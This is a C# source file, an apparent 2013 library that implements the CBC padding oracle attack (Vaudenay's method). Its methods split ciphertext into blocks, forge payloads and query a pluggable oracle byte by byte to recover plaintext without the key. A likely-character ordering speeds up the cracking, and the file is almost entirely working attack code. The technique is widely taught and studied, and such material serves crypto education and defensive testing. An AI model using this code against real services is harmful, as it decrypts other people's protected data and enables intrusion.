/*
 * author: martani (martani.net@gmail.com)
 * copyright 2013
 * 
 */
using System;
using System.Collections.Generic;

namespace PaddingOracleAttackLib
{
	public class PaddingOracleAttacker
	{
		const int BLOCK_SIZE = 16;
		
		//The internal Oracle used to query for the correctness of the padding
		private ICBCOracle _CBCOracle;
		
		public PaddingOracleAttacker (ICBCOracle oracle)
		{
			_CBCOracle = oracle;
		}
		/// <summary>
		/// Decrypts the specified hexCipher using the Padding Oracle Attack.
		/// </summary>
		/// <param name='hexCipher'>
		/// The cipher text represented as a hex string (hex values represent the UTF8 value of bytes).
		/// </param>
		public string Decrypt (string hexCipher)
		{
			if (hexCipher == null)
				return null;
			
			byte[] cipher = Helpers.ConvertHexStringToByteArray (hexCipher);
			return Decrypt (cipher);
		}
		
		
		/// <summary>
		/// Decrypts the specified cipher using the Padding Oracle Attack.
		/// </summary>
		/// <param name='cipher'>
		/// The cipher text as an array of bytes (UTF8).
		/// </param>
		/// <exception cref='Exception'>
		/// The cipher array must have a length multiple of 16 (16 bytes is the size of 1 block).
		/// </exception>
		public string Decrypt (byte[] cipher)
		{
			if (cipher == null || cipher.Length % BLOCK_SIZE != 0)
				throw new Exception ("Wrong CBC cipher, Length not multiple of block size (16 bytes)");
			
			//Split the cipher into blocks of 16 bytes
			int nbBlocks = cipher.Length / BLOCK_SIZE;
			byte[][] cipherBlocks = new byte[nbBlocks][];
			
			for (int i=0; i<nbBlocks; i++) {
				cipherBlocks [i] = new byte[BLOCK_SIZE];
				Array.Copy (cipher, i * BLOCK_SIZE, cipherBlocks [i], 0, BLOCK_SIZE);
			}
			
			string plainText = "";
			//Start attack!
			for (int i=1; i<cipherBlocks.Length; i++) {
				Console.WriteLine ("\n[[[ Decrypting Block {0}/{1} ]]]", i, cipherBlocks.Length - 1);
				string tmps = this.DecryptBlock (cipherBlocks [i], cipherBlocks [i - 1]);
				plainText += tmps;
				
				Console.WriteLine ("\n>>> Decryted block {0}: {1}", i, tmps);
			}
			
			return plainText;
		}
		
		
		/// <summary>
		/// Decrypts one block at a time using Vaudney's method (Padding Oracle Attack).
		/// </summary>
		/// <returns>
		/// String representation (UTF8) of the decrypted block.
		/// </returns>
		/// <param name='block'>
		/// A 16 bytes array representing the block de decrypt.
		/// </param>
		/// <param name='IV'>
		/// The CBC block used in the chaining step (first is IV, then C_0, C_1 etc.)
		/// </param>
		private string DecryptBlock (byte[] block, byte[] IV)
		{
			byte[] decryptedBlock = new byte[16];
			
			//Decrypt the last bytes found in the first matching PKCS#7 padding
			int paddingLen = DecryptLastNBytes (block, IV, decryptedBlock);
			
			//Decrypt the rest of the 16 - paddingLen bytes
			int lastDecryptedBytePos;
			for (int i=0; i<block.Length - paddingLen; i++) {
				lastDecryptedBytePos = block.Length - 1 - paddingLen - i;
				DecryptByteAtPosition (block, IV, lastDecryptedBytePos, decryptedBlock);
			}
			
			//Perform the CBC chaining
			decryptedBlock = Helpers.Xor (decryptedBlock, IV);
			
			//Cast the result back to an UTF8 string
			string strRes = Helpers.ConvertByteArrayToUTF8String (decryptedBlock);
			return strRes;
		}
		
		/// <summary>
		/// Decrypts the last N bytes in a block, for an X padding (ie. [DATA...XXXXX]), it decrypts the last X bytes.
		/// </summary>
		/// <returns>
		/// The number of decrypted bytes, Guaranteed 1 at least!
		/// </returns>
		/// <param name='cipherBlock'>
		/// The cipher block.
		/// </param>
		/// <param name='IV'>
		/// IV
		/// </param>
		/// <param name='resultDecrypted'>
		/// The results are saved in this buffer.
		/// </param>
		private int DecryptLastNBytes (byte[] cipherBlock, byte[] IV, byte[] resultDecrypted)
		{
			//The payload contains the cipherBlock 16 bytes and a modified 16 bytes block
			byte[] payload = new byte[cipherBlock.Length * 2];
			Random r = new Random ();
			r.NextBytes (payload);
			
			//Copy the cipherBlock to the second half of payload
			Array.Copy (cipherBlock, 0, payload, cipherBlock.Length, cipherBlock.Length);
			
			//1. last block decryption
			int count = 0;
			foreach (var b in GetCharsOrdered(IV[cipherBlock.Length - 1])) {
				payload [cipherBlock.Length - 1] = b;
#if DEBUG
                Console.Write("\r\t\t\tOracle calls: {0}     ", count);
#endif

				if (this._CBCOracle.RequestOracle (payload)) {
					Console.Write ("\r                                                      ");
					Console.WriteLine ("\rGot last byte after {0} Oracle calls", count);
					break;
				}
				++count;
			}
			
			//1.2
			//Right now, we are sure we know at least 1 byte; we check if we can get more with this padding (PKCS#7)
			byte lastChangedByte;
			int paddingLength = 1;
			
			for (int i = 0; i < cipherBlock.Length - 1; i++) {
				//try to alter byte at position i
				//if Oracle responds that the padding is no longer valid, then we got our last padding byte (right to left)
				lastChangedByte = payload [i];
				payload [i]++;

#if DEBUG
                Console.Write("\r                          Oracle calls: {0}   ", i); 
#endif
				if (this._CBCOracle.RequestOracle (payload) == false) {
					Console.Write ("\r                                                 ");

					paddingLength = cipherBlock.Length - i;
					Console.WriteLine ("\rDecrypted {0} bytes of last block", paddingLength);
					
					//restore changed byte to its initial state
					payload [i] = lastChangedByte;
					break;
				}
				
				payload [i] = lastChangedByte;
			}
		
			//Copy the padded block back
			for (int i = 0; i < paddingLength; i++) {
				resultDecrypted [cipherBlock.Length - i - 1] = (byte)(paddingLength ^ payload [cipherBlock.Length - i - 1]);
			}
			
			return paddingLength;
		}
		
		/// <summary>
		/// Decrypts a byte from the block at a specific position.
		/// </summary>
		/// <param name='cipherBlock'>
		/// Cipher block.
		/// </param>
		/// <param name='IV'>
		/// IV.
		/// </param>
		/// <param name='bytePosition'>
		/// Byte position.
		/// </param>
		/// <param name='resultDecrypted'>
		/// The results buffer.
		/// </param>
		private void DecryptByteAtPosition (byte[] cipherBlock, byte[] IV, int bytePosition, byte[] resultDecrypted)
		{
			if (bytePosition >= cipherBlock.Length - 1)
				throw new Exception ("Wrong byte position, if last byte, call DecryptLastByte first");

			if (cipherBlock.Length != 16)
				throw new Exception ("Wrong block length");
			
			//The payload contains the concatenation of a pseudo IV block with the cipher text
			byte[] payload = new byte[cipherBlock.Length * 2];
			Random r = new Random ();
			r.NextBytes (payload);
			
			//Copy the cipherBlock to the second half of payload
			Array.Copy (cipherBlock, 0, payload, cipherBlock.Length, cipherBlock.Length);
			
			int b = 16; //BLOCK SIZE
			int j = bytePosition + 1;
			
			//Init the padding given the last N bytes in resultDecrypted
			for (int k = j; k < b; k++)
				payload [k] = (byte)(resultDecrypted [k] ^ (b - (1 + j) + 2));
			
			int i = 0;
			//for (i = 0; i < 256; i++)
			foreach (var c in GetCharsOrdered((byte)(IV[bytePosition] ^ (b - (1 + j) + 2)))) {
				payload [bytePosition] = c;
				
#if DEBUG
                Console.Write("\r                          Oracle calls: {0}   ", i);
#endif
				
				if (this._CBCOracle.RequestOracle (payload)) {
					Console.Write ("\r                                           ");
					Console.Write ("\rByte {0} --\t {1} Oracle calls\n", bytePosition, i);
					break;
				}
				
				++i;
			}
			
			if (i >= 256)
				throw new Exception ("Failed to decrypt byte. Halt!");
			
			//The final result for byte at position bytePosition.
			resultDecrypted [bytePosition] = (byte)(payload [bytePosition] ^ (b - (1 + j) + 2));
		}
		
		/// <summary>
		/// This collections returns the characters that are likely to be in the plain text after decryption.
		/// After decryption, the characters are XORed with IV, hence, this collection returns the most
		/// likely characters XORed to give the final byte to try for a correct padding.
		/// Used to speed up the cracking!
		/// </summary>
		private static IEnumerable<byte> GetCharsOrdered (byte IV)
		{
			List<Tuple<byte, byte>> charsPriorityLevels = new List<Tuple<byte, byte>> ();
			
			charsPriorityLevels.Add (new Tuple<byte, byte> (97, 126));	//a-z
			charsPriorityLevels.Add (new Tuple<byte, byte> (65, 96));		//A-Z
			charsPriorityLevels.Add (new Tuple<byte, byte> (32, 66));		//punctuations
			charsPriorityLevels.Add (new Tuple<byte, byte> (0, 31));
			charsPriorityLevels.Add (new Tuple<byte, byte> (127, 255));
			
			foreach (var item in charsPriorityLevels) {
				for (int i = item.Item1; i <= item.Item2; i++) {
					yield return (byte)(i ^ IV);
				}
			}
		}
	}
}

